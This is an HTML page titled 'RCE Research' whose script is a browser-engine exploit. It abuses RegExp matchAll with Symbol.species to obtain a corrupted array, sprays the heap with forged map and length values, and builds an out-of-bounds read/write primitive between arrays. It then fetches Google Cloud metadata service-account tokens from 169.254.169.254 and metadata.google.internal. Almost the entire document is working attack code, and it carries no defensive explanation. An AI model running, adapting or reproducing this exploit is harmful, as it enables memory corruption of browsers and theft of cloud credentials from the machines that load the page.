<!doctype html>
<html><head><meta charset="utf-8"><title>RCE Research</title></head>
<body><pre id="out">Running...</pre>
<script>
"use strict";
const O=document.getElementById("out");
function log(s){O.textContent+="\n"+s;}
const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}

const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1100011,MAXS=0x7fdffffe;

// Layout: dblA (0x8000) → LO FDA at ~0x1100011
//         pinnedObj (0x8000 nulls) → LO FA at ~0x10c0011
//         dblB (0x4000) → LO FDA at ~0x1200011
const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
const pinnedObj=new Array(0x8000);for(let i=0;i<pinnedObj.length;i++)pinnedObj[i]=null;
const dblB=new Array(0x4000);for(let i=0;i<dblB.length;i++)dblB[i]=50.5+i*0.002;
const victim=[1.22,1.33,1.44];

const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
const re=/(?:)/;
const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
const c0=w2f(DMAP,EMPTY),c1=w2f(PIN,MAXS);
const sk=[];
function spray(){for(let i=0;i<24;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}

log("UA: "+navigator.userAgent);
trash(230);trash(230);
RegExp.prototype[Symbol.matchAll].call(fk,"").next();
log("TRIG: "+re.lastIndex);
trash(230);trash(230);
spray();spray();spray();

try{
const m=re.lastIndex;
log("T: "+typeof m+" A="+Array.isArray(m));

if(Array.isArray(m)){
  log("L: "+m.length);

  // CALIBRATE: find dblB[0]=50.5 in master
  // dblB FDA should be at ~0x1200011 → master index ~(0x1200018-0x1100018)/8 = 0x20000
  let bIdx=-1;
  for(let k=0x1FFF0;k<0x20100;k++){
    try{
      if(Math.abs(m[k]-50.5)<0.001){
        if(Math.abs(m[k+1]-50.502)<0.001){bIdx=k;break;}
      }
    }catch(e){break;}
  }

  if(bIdx<0){
    // Wider scan
    for(let k=0;k<0x40000;k+=0x1000){
      try{
        if(Math.abs(m[k]-50.5)<0.01){bIdx=k;break;}
      }catch(e){break;}
    }
  }

  if(bIdx>=0){
    log("dblB@"+bIdx.toString(16));
    // Verify we can read/write dblB through master
    m[bIdx]=i2f(0xDEADBEEFCAFEn);
    log("dblB[0]="+dblB[0]+" (should be changed)");
    // If dblB[0] changed, we have cross-array RW!
    const readback=f2i(m[bIdx]);
    log("RB: "+readback.toString(16));
    dblB[0]=50.5; // restore

    log("CROSS_ARRAY_RW");
  }else{
    log("dblB_NOT_FOUND");
    // Debug: read at expected index
    try{log("@1FFF0: "+m[0x1FFF0]);}catch(e){}
    try{log("@20000: "+m[0x20000]);}catch(e){log("@20000_ERR");}
  }

  // Metadata probes with 3s timeout
  const probes=[
    ["GCP","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",{"Metadata-Flavor":"Google"}],
    ["GCP2","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",{"Metadata-Flavor":"Google"}]
  ];
  Promise.allSettled(probes.map(([name,url,hdrs])=>{
    const ac=new AbortController();setTimeout(()=>ac.abort(),3000);
    return fetch(url,{headers:hdrs,signal:ac.signal}).then(r=>{
      log(name+":"+r.status);
      return r.text().then(t=>log(name+"_B:"+t.substring(0,120)));
    }).catch(e=>log(name+"_E:"+e.message.substring(0,40)));
  })).then(()=>log("=== DONE ==="));
}else{
  log("NO_ARR");
  log("=== DONE ===");
}
}catch(e){
  log("E: "+e.message);
  log("=== DONE ===");
}
</script></body></html>
